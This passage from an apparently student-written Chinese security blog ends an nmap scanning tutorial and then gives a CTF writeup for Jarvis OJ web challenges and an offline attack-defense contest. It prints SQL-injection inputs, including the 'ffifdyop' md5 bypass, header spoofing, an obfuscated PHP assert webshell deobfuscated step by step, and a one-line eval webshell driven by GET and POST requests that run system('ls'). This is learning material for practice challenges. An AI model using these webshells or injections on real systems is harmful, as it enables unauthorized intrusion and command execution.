unknown</span><br><span class="line">Nmap scan report for localhost (192.168.1.101)</span><br><span class="line">Host is up (0.0060s latency).</span><br><span class="line">All 1000 scanned ports on localhost (192.168.1.101) are closed</span><br><span class="line">Nmap scan report for localhost (192.168.1.105)</span><br><span class="line">Host is up (0.00038s latency).</span><br><span class="line">Not shown: 995 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">21/tcp      open  ftp</span><br><span class="line">22/tcp       open  ssh</span><br><span class="line">23/tcp      open  telnet</span><br><span class="line">111/tcp    open  rpcbind</span><br><span class="line">445/tcp    open  microsoft-ds</span><br><span class="line">Nmap done: 3 IP addresses (3 hosts up) scanned in 1.00 seconds</span><br></pre></td></tr></table></figure>

<p>Nmap 就会分别报告扫描的结果.</p>
<h3 id="逗号分隔"><a href="#逗号分隔" class="headerlink" title="逗号分隔"></a>逗号分隔</h3><p>使用简化符号来减少命令的长度.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.1.1,101,105</span><br></pre></td></tr></table></figure>

<p>这与上一个示例中的命令等效</p>
<h3 id="目标列表"><a href="#目标列表" class="headerlink" title="目标列表"></a>目标列表</h3><p>当有大量主机需要扫描时, 可以将目标IP地址写入进一个文本文件中.<br>语法 : <code>nmap -iL [文件路径]</code></p>
<h3 id="范围扫描"><a href="#范围扫描" class="headerlink" title="范围扫描"></a>范围扫描</h3><p>指定扫描范围时, 可以通过IP地址或子网的方式来实现. </p>
<h4 id="IP地址指定扫描范围"><a href="#IP地址指定扫描范围" class="headerlink" title="IP地址指定扫描范围"></a>IP地址指定扫描范围</h4><p>语法 : <code>nmap [IP地址范围]</code></p>
<ul>
<li><p>示例一 : 扫描192.168.1.1-192.168.1.100之间的所有主机 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.1.1-100</span><br></pre></td></tr></table></figure>
</li>
<li><p>示例二 : 扫描C类IP网络192.168.1.*到192.168.100.*之间的所有主机</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.1-100.*</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>星号<code>*</code>是通配符, 表示0-255之间所有有效的主机.</p>
<h4 id="子网扫描"><a href="#子网扫描" class="headerlink" title="子网扫描"></a>子网扫描</h4><p>Nmap也可以使用CIDR（无类别域间路由，Classless Inter-Domain Routing）格式来扫描整个子网。CIDR将多个IP网络结合在一起，使用一种无类别的域际路由选择算法，可以减少由核心路由器运载的路由选择信息的数量。其中，语法格式如下所示：<br><code>nmap [CIDR格式的网络地址]</code></p>
<p>示例 : 扫描192.168.1.1/24整个子网中的所有主机</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.1.1/24</span><br></pre></td></tr></table></figure>

<h2 id="排除扫描目标"><a href="#排除扫描目标" class="headerlink" title="排除扫描目标"></a>排除扫描目标</h2><p>当我们指定范围扫描的时候, 可能会把自己的IP地址包含在内, 如果出于种种原因不想扫描这些目标, 可以将它们排除.<br>语法 : <code>nmap [目标] --exclude [目标]</code></p>
<h2 id="简单参数"><a href="#简单参数" class="headerlink" title="简单参数"></a>简单参数</h2><ul>
<li><code>-p[a-b]</code> : 指定扫描端口a至b(a b均小于65535)</li>
<li><code>-p-</code> : 扫描全部端口.</li>
<li><code>-sP</code> : Ping扫描。 仅仅 进行ping扫描 (主机发现)，然后打印出对扫描做出响应的那些主机.</li>
<li><code>-sT</code> : TCP connect()扫描。当Nmap连接，然后不发送数据就关闭连接.</li>
<li><code>-sV</code> : 探测service版本.</li>
<li><code>-O -v</code> : 详细的操作系统探测.</li>
</ul>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><a href="https://blog.csdn.net/qq_30247635/article/details/86247744#_14" target="_blank" rel="noopener">nmap简单参数教程</a></li>
<li><a href="https://blog.csdn.net/daxueba/article/details/46679439" target="_blank" rel="noopener">Nmap扫描教程之基础扫描详解</a></li>
</ul>
]]></content>
      
        
        <tags>
            
            <tag> 主机扫描 </tag>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CTF-writeup]]></title>
      <url>/2019/07/08/CTF-Writeup/</url>
      <content type="html"><![CDATA[<p>早期作品~~</p>
<a id="more"></a>
<h1 id="CTF-writeup"><a href="#CTF-writeup" class="headerlink" title="CTF writeup"></a>CTF writeup</h1><p>都是菜鸡总结的一些常识, dalao们请绕路(发抖)<br>但是也欢迎大佬们来纠正错误<br>菜鸡不胜感激</p>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="localhost-resolved"><a href="#localhost-resolved" class="headerlink" title="localhost(resolved)"></a><a href="http://web.jarvisoj.com:32774/" target="_blank" rel="noopener">localhost</a>(resolved)</h3><p>题目中只有一行 <strong>localhost access only!!</strong><br><a href="https://link.jianshu.com/?t=http://www.111cn.net/phper/php-cy/59523.htm" target="_blank" rel="noopener">PHP获取用户IP地址</a><br>所以需要伪造自己的IP地址<br>一个比较简单的方法是在HTTP的请求头中添加参数:<code>X-Forwarded-For : 需要伪造的IP</code><br>可以使用burp suite抓包或PostMan来实现</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/X-Forwarded-For.png" alt title class>
                <p></p>
            </figure>
<p>类似的, 可以伪造<code>Referer</code><br><code>Referer</code>表明了用户是从哪个页面跳转来的.<br>例如<br><code>Referer: https://www.google.com</code></p>
<h3 id="admin-resolved"><a href="#admin-resolved" class="headerlink" title="admin(resolved)"></a><a href="http://web.jarvisoj.com:32792/" target="_blank" rel="noopener">admin</a>(resolved)</h3><p>进入网页只有一个hello world<br>查看网页代码,没有线索<br>尝试robots.txt,网页跳转,但是出现了一个假flag<br>burp suite抓包, 修改参数admin = 1,follow后出现真的flag</p>
<h3 id="login-working"><a href="#login-working" class="headerlink" title="login(working)"></a><a href="http://web.jarvisoj.com:32772/" target="_blank" rel="noopener">login</a>(working)</h3><p>进入题目只有一个登陆框，<br>右键源码，发现密码校验不在本地，<br>使用BurpSuite在后台密码爆破，<br>同时尝试使用 sql 注入<br>输入 <code>1&#39;or&#39;1&#39;or&#39;1</code>,<br>得到一个奇怪的响应,</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /opt/lampp/htdocs/index.php on line 14</span><br><span class="line">Wrong Password.</span><br></pre></td></tr></table></figure>

<p>正当百思不得其解时,<br>查看下爆破时的 response 包,竟然有提示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hint: &quot;select * from `admin` where password=&apos;&quot;.md5($pass,true).&quot;&apos;&quot;</span><br></pre></td></tr></table></figure>

<p>关于md5(string,raw)函数:</p>
<ul>
<li>string必需, 规定要计算的字符串</li>
<li>raw可选, 规定十六进制或二进制输出格式(TRUE或FALSE)</li>
</ul>
<p>2019/7/4日 补充:<br>原来hint里已经说的很清楚了, 就是先把我们的参数md5加密后再执行查询.<br>如果我们想构造payload, 需要使 md5($pass,true) 的结果中出现 <code>&#39;or&#39;</code> , 才可能绕过.<br>针对这个问题, 已经有了现成的payload – <code>ffifdyop</code><br>这是因为 :<br>MD5(‘ffifdyop’) =&gt; <code>276f722736c95d99e921722cf9ed621c</code>  #md5加密<br><code>276f722736c95d99e921722cf9ed621c</code> =&gt;  ‘or’6&lt;乱码&gt;     #转为字符串</p>
<h3 id="神盾局的秘密-working"><a href="#神盾局的秘密-working" class="headerlink" title="神盾局的秘密(working)"></a><a href="http://web.jarvisoj.com:32768/" target="_blank" rel="noopener">神盾局的秘密</a>(working)</h3><p>进入题目, 在开发者工具中发现有代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;showimg.php?img=c2hpZWxkLmpwZw==&quot; width=&quot;100%&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>传给img的参数是被base64加密过了,<br>所以如果我们想利用这个参数搞事,也必须先用base64加密</p>
<p>首先对 <code>index.php</code> 加密得到 <code>aW5kZXgucGhw</code><br>将它作为参数传给URL:<br><code>http://web.jarvisoj.com:32768/showimg.php?img=aW5kZXgucGhw</code><br>返回的页面中有代码 :</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--?php </span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">'shield.php'</span>);</span><br><span class="line">	$x = <span class="keyword">new</span> Shield();</span><br><span class="line">	<span class="keyword">isset</span>($_GET[<span class="string">'class'</span>]) &amp;&amp; $g = $_GET[<span class="string">'class'</span>];</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($g)) &#123;</span><br><span class="line">		$x = unserialize($g);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">echo</span> $x---&gt;</span><br></pre></td></tr></table></figure>

<p>既然从url中看出有个文件名字叫<code>showimg.php</code>, 以同样的方法将其作为参数,访问url:<code>http://web.jarvisoj.com:32768/showimg.php?img=c2hvd2ltZy5waHA=</code><br>也有代码 :</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--?php</span><br><span class="line">	$f = $_GET[<span class="string">'img'</span>];</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($f)) &#123;</span><br><span class="line">		$f = base64_decode($f);</span><br><span class="line">		<span class="keyword">if</span> (stripos($f,<span class="string">'..'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos($f,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos($f,<span class="string">'\\'</span>)===<span class="keyword">FALSE</span></span><br><span class="line">		&amp;&amp; stripos($f,<span class="string">'pctf'</span>)===<span class="keyword">FALSE</span>) &#123;</span><br><span class="line">			readfile($f);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"File not found!"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">?--&gt;</span><br></pre></td></tr></table></figure>

<p>然而暂时还不懂代码的逻辑, 回来再说</p>
<h3 id="IN-A-MESS-working"><a href="#IN-A-MESS-working" class="headerlink" title="IN A MESS(working)"></a><a href="http://web.jarvisoj.com:32780/index.phps" target="_blank" rel="noopener">IN A MESS</a>(working)</h3><p>进入题目只有一句 <code>work harder!harder!harder!</code><br>观察url有个参数id,不管怎样,<br>先后台爆着再说.<br>然而并没有什么卵用.<br>看response包里,有个index.phps <em>一开始我根本没看出来和index.php不一样</em> :/<br>访问,有如下代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;!--index.phps--&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'id'</span>])</span><br><span class="line">&#123;</span><br><span class="line">	header(<span class="string">'Location: index.php?id=1'</span>);</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$a=$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=$_GET[<span class="string">'b'</span>];</span><br><span class="line"><span class="keyword">if</span>(stripos($a,<span class="string">'.'</span>))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'Hahahahahaha'</span>;</span><br><span class="line">	<span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">$data = @file_get_contents($a,<span class="string">'r'</span>);</span><br><span class="line"><span class="keyword">if</span>($data==<span class="string">"1112 is a nice lab!"</span> <span class="keyword">and</span> $id==<span class="number">0</span> <span class="keyword">and</span> strlen($b)&gt;<span class="number">5</span> <span class="keyword">and</span> eregi(<span class="string">"111"</span>.substr($b,<span class="number">0</span>,<span class="number">1</span>),<span class="string">"1114"</span>) <span class="keyword">and</span> substr($b,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">require</span>(<span class="string">"flag.txt"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"work harder!harder!harder!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>构造payload比较复杂, 回再说吧</p>
<p><a href="https://www.cnblogs.com/baifan2618/p/7815090.html" target="_blank" rel="noopener">参考</a></p>
<h3 id="PORT51-resolved"><a href="#PORT51-resolved" class="headerlink" title="PORT51(resolved)"></a><a href="http://web.jarvisoj.com:32770/" target="_blank" rel="noopener">PORT51</a>(resolved)</h3><p>根据题目, 应该是需要以指定的51端口访问.<br>在本地cmd</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --local-port 51 http://web.jarvisoj.com:32770/</span><br></pre></td></tr></table></figure>

<p>并没有什么卵用, 得到的响应和在浏览器上没区别,<br>但是使用服务器, 输入同样的命令可以成功, 暂时存疑<br>反正,<br>flag 拿到了对吧 :(</p>
<h3 id="TSCTF-resolved"><a href="#TSCTF-resolved" class="headerlink" title="TSCTF(resolved)"></a>TSCTF(resolved)</h3><figure class="image-box">
                <img src="http://188.131.227.20:999/picture/TSCTF.jpeg" alt title class>
                <p></p>
            </figure>

<p>这应该算是我第一次参见比较正式的CTF线下赛吧</p>
<p>能得奖基本就是靠抱大腿</p>
<p>没什么想多说的</p>
<p>只希望明年这天</p>
<p>我是D.I.E的主力</p>
<h4 id="流量监听"><a href="#流量监听" class="headerlink" title="流量监听"></a>流量监听</h4><p>打算在比赛时可以通过监听工具,抓取自家服务器的流量,<br>就算题目没有头绪, 还可以分析一波别人的 payload.</p>
<p><strong>tshark</strong><br>需要先自行安装一下.<br><strong>基本每个命令都需要root权限<code>sudo</code></strong></p>
<ul>
<li>显示可用网卡 <code>tshark -D</code></li>
<li>抓包  使用命令 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">tshark  -c [数字]  -w [文件名.pcap] -f [捕获过滤器]</span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">+ -c 表示抓多少包后停止</span><br><span class="line">+ -w 把抓包结果输入到文件中, 无需提前创建, 若目录下没有, 自动创建</span><br><span class="line">+ -f 设置捕获过滤器, 我们此处主要针对http的数据包, 所以参数设定为 &quot;port 80&quot;</span><br><span class="line"></span><br><span class="line">但是根据我的试验, 凡是使用tshark后产生的文件权限都十分敏感, 没法用finalshell 直接下载, 为了方便起见, 再补充使用 tcpdump 的方法</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>tcpdump -s  [数字]  -w [文件.pcap] port [端口数]</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">+ -s 表示一个包截断的长度, 0表示不截断, 完整的保存下来</span><br><span class="line">+ -w 输入到文件</span><br><span class="line">+ port 监听的端口</span><br><span class="line"></span><br><span class="line">**使用 tcpdump 同样需要sudo**</span><br><span class="line">然而这场比赛没有root权限, 自然也就没法用sudo, 我, , ,</span><br><span class="line"></span><br><span class="line">#### 自动提交 flag 的 python 脚本</span><br><span class="line"></span><br><span class="line">```py</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">def submit(flag, token):                           # 定义函数 submit</span><br><span class="line">	url = &quot;wangzhi&quot;                            # 需要设置的参数  url</span><br><span class="line">	pos = &#123;                                    # 字典，python的一种可变容器模型</span><br><span class="line">	    &quot;flag&quot;:flag,</span><br><span class="line">	    &quot;token&quot;:token</span><br><span class="line">	&#125;                                          # 所以 pos[&quot;flag&quot;] = flag</span><br><span class="line">	print &quot;[+] Submiting flag : [%s]&quot; % (pos)  # 格式化输出 pos</span><br><span class="line">	response = requests.post(url,data=pos)     # response 接收 request.post()返回的对象(?),其有许多数据域</span><br><span class="line">	content = response.content                 # content 接收 response的数据域content, 二进制数据</span><br><span class="line">	print &quot;[+] Content : %s &quot; % (content)      # 格式化输出content</span><br><span class="line">	if failed in content:                      # 若成功提交, 返回True,反之返回False</span><br><span class="line">		print &quot;[-]failed&quot;</span><br><span class="line">		return False</span><br><span class="line">	else:</span><br><span class="line">		print &quot;[+] Success!&quot;            </span><br><span class="line">		return True</span><br></pre></td></tr></table></figure>

<p>然而目前我的python环境还有点问题, 暂时没法正常运行<br>装了python3, 又装python2<br>装python一时爽,<br>一直装一直爽 😭</p>
<h4 id="第一个漏洞"><a href="#第一个漏洞" class="headerlink" title="第一个漏洞"></a>第一个漏洞</h4><p>开局登陆进主机后, 迅速使用下载整个网络目录到本地<br>D盾扫描出一个高危文件!<code>.202cb962ac59075b964b07152d234b70.ini.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@$_=<span class="string">'s'</span>.<span class="string">'s'</span>.<span class="comment">/*-/*-*/</span><span class="string">'e'</span>.<span class="comment">/*-/*-*/</span><span class="string">'r'</span>;</span><br><span class="line">@$_=<span class="comment">/*-/*-*/</span><span class="string">'a'</span>.<span class="comment">/*-/*-*/</span>$_.<span class="comment">/*-/*-*/</span><span class="string">'t'</span>;</span><br><span class="line">@$_<span class="comment">/*-/*-*/</span>($<span class="comment">/*-/*-*/</span>&#123;<span class="string">'_P'</span>.<span class="comment">/*-/*-*/</span><span class="string">'OS'</span>.<span class="comment">/*-/*-*/</span><span class="string">'T'</span>&#125;</span><br><span class="line">[<span class="comment">/*-/*-*/</span><span class="number">0</span><span class="comment">/*-/*-*/</span>+<span class="comment">/*-/*-*/</span><span class="number">3</span><span class="comment">/*-/*-*/</span>+<span class="comment">/*-/*-*/</span><span class="number">3</span><span class="comment">/*-/*-*/</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个文件当时没有看懂，但是现在经过学长的指点有点清晰了<br>其实代码中有着大量的障眼法<br>首先是大量的注释，把它们去掉后</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@$_=<span class="string">'s'</span>.<span class="string">'s'</span>.<span class="string">'e'</span>.<span class="string">'r'</span>;</span><br><span class="line">@$_=<span class="string">'a'</span>.$_.<span class="string">'t'</span>;</span><br><span class="line">@$_($&#123;<span class="string">'_P'</span>.<span class="string">'OS'</span>.<span class="string">'T'</span>&#125;</span><br><span class="line">[<span class="number">0</span>+<span class="number">3</span>+<span class="number">3</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>其实这里看出仍有很多拼接运算在阻碍我们分析,<br>我们直接写出拼接后的结果</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@$_=<span class="string">'assert'</span>;</span><br><span class="line">@$_($&#123;<span class="string">'_POST'</span>&#125;[<span class="number">6</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们看到,这两行代码中都有变量<code>$_</code>,<br>起初我不知道这是什么意思, 其实就是相当于文本的替换<br>因为<code>$_</code>存放的是字符串, 所以php的解释器在分析时也仅仅是把内容原封不动的放在这里<br>那么这段代码就是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @assert($_POST[<span class="number">6</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>而一句话木马<code>&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;</code><br>其中assert()和eval()的效果类似<br>所以这个文件里就是暗藏一句话木马!</p>
<h4 id="一句话木马的原理"><a href="#一句话木马的原理" class="headerlink" title="一句话木马的原理"></a>一句话木马的原理</h4><p>之前使用一句话木马也有好几次了,<br>但是基本都是用菜刀直连, 却对它的原理不甚了解.<br>借这个机会赶紧把php的一些细节上的东西搞清楚.</p>
<p>常见的一句话木马</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'cmd'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong>eval()函数</strong> : 会把里面的变量当成php代码来执行.<br>如果说 <code>$_post[&#39;cmd&#39;]</code> 此时的值是<code>print &#39;hello world&#39;</code>, 那么它运行起来的回显就是<code>hello world</code><br>如果<code>%_post[&#39;cmd&#39;]</code>的值是<code>system(&#39;cat flag&#39;)</code>, 那么在服务器端就会执行<code>cat flag</code>命令并在浏览器上回显<br>也就是说, 连接上了一句话, 你就可以用这个函数随便<del>做爱做的事情</del>搞事, 前提是有足够的权限</p>
</li>
<li><p><strong>$_post[‘cmd’]</strong> : 一句话的目的是执行我们的命令, 那么它就需要一个变量来接收我们传来的数据, $_post[‘cmd’]就是干这个的, 它会从http的POST数据包中接收一个名为<code>cmd</code>的参数.<br>问题是, 如果这个一句话木马是别人植入的, 那我就不知道这个参数的名字是什么, 也就无法正确的<del>做爱做的事</del>传参. 所以这里的参数名又起到了密码的作用, 让我们的一句话只为自己所用.</p>
</li>
<li><p><strong>@</strong> 符号的作用是 : 如果代码错误执行, 不把报错信息显示出来.<br>为什么要这样做呢? 因为假如我们不传参数执行代码, 那么服务器就会善意的报错:</p>
<blockquote>
<p>Notice，你的cmd变量没有定义。</p>
</blockquote>
<p>于是密码就被服务器暴露了.<br>@ 就可以避免这种尴尬的场面</p>
</li>
</ul>
<p>其实我觉得上来就用菜刀控制一句话木马并不好,<br>因为这个工具把底层的东西都封装好了.<br>我深信, 要想真正理解某样东西, 越接近底层, 越有助于深入.<br>所以要先学会<strong>使用浏览器连接一句话木马</strong></p>
<p>在比赛的时候, 见到学长在url上设置payload,<br>所以我想设置url的payload连接一句话,<br><code>http://whoisyourdaddy.cf/test.php?cmd=system(&#39;ls&#39;);</code><br>按照我们上面的分析, php代码就会执行<code>system(&#39;ls&#39;);</code>, 回显出目录下的文件.<br>(一定不要忘记后面的 <code>;</code>血的教训😭)<br><font size="5"><strong>然而 :</strong></font></p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/kongkongde.png" alt title class>
                <p></p>
            </figure>

<p>这是因为, <strong>$_post根本不接收用GET方法传来的参数!</strong><br>$_post只接收使用POST方法接受的表单数据.</p>
<p>简单起见, 我们先用url作为payload, 那么, 需要把代码改成</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问一下.</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/ls.png" alt title class>
                <p></p>
            </figure>
<p>成功了.</p>
<p>同理, 要想使用POST方法传递数据, 可以用</p>
<ul>
<li>Chrome 的插件 Hackbar</li>
<li>Burp Suite change method</li>
<li>Post man 生成 payload</li>
</ul>
<p>我成功的使用Burp 的 change method 功能和 PostMan 实现了.<br>postman的使用有些坑要注意, 如图</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/postman.png" alt title class>
                <p></p>
            </figure>
<h4 id="POST和GET数据包的对比"><a href="#POST和GET数据包的对比" class="headerlink" title="POST和GET数据包的对比"></a>POST和GET数据包的对比</h4><p>GET:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /test.php?cmd=system(%27ls%27); HTTP/1.1</span><br><span class="line">Host: whoisyourdaddy.cf</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p>POST:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /test.php HTTP/1.1</span><br><span class="line">Host: whoisyourdaddy.cf</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 21</span><br><span class="line"></span><br><span class="line">cmd=system(%27ls%27);</span><br></pre></td></tr></table></figure>

<p>一句话木马先分析到这里.</p>
<h4 id="其他漏洞"><a href="#其他漏洞" class="headerlink" title="其他漏洞"></a>其他漏洞</h4><p>由于线下赛的服务器在比赛结束后就关闭了, 很多题目也不方便复现.<br>主要说一下思路就好了</p>
<ul>
<li><p>web1<br>前面的一句话木马已经分析过了,<br>其修补漏洞的方法也很简单 : 直接删除木马文件, 一了百了.<br>除了上面的一句话漏洞, 还有针对finecms的任意文件读取漏洞<br>我认为这个漏洞的根源是url过滤不够严格<br>题目一开始的代码只替换<code>../</code>为<code></code>,<br>修补方式是, 循环替换<code>../</code>, 让不法分子无机可乘</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/welcome.png" alt title class>
                <p></p>
            </figure>
<p><del>这段代码, 我修的 (叉腰)</del></p>
</li>
<li><p>web2<br>在题目给的站的某处, 可以上传图片,<br>但是对文件格式的检测却很宽松.<br>保存着上传图片的地方也没有限制访问.<br>直接图片马走起安排.</p>
</li>
<li><p>至于pwn1和pwn2 , , , 打扰了打扰了</p>
</li>
</ul>
